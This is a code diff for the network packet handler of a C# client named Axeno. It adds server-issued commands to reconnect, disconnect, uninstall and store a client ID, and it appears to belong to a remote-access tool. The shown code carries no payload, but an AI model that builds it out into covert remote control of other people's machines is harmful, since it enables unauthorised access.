@@ -1,4 +1,5 @@
-﻿using MessagePackLib.MessagePack;
+﻿using Axeno.Client.MessagePack;
+using Axeno.Client.Networking.Functions;
 using System;
 using System.Collections.Generic;
 using System.Linq;
@@ -6,6 +7,7 @@ using System.Net.Sockets;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
+using System.Windows.Forms;
 
 namespace Axeno.Client.Networking
 {
@@ -20,9 +22,26 @@ namespace Axeno.Client.Networking
                 msgpck.DecodeFromBytes((byte[])data);
                 switch (msgpck.ForcePathObject("Packet").AsString)
                 {
-                    case "ClientInformation":
+                    case "ReconnectClient":
                         {
-
+                            ClientControl.Reconnect();
+                            break;
+                        }
+                    case "DisconnectClient":
+                        {
+                            ClientControl.Disconnect(); 
+                            break;
+                        }
+                    case "UninstallClient":
+                        {
+                            ClientControl.Uninstall();
+                            break;
+                        }
+                    case "ClientUID":
+                        {
+                            string uid = msgpck.ForcePathObject("UID").AsString;
+                            MessageBox.Show(uid);
+                            ClientControl.SaveUID(uid);
                             break;
                         }
                 }
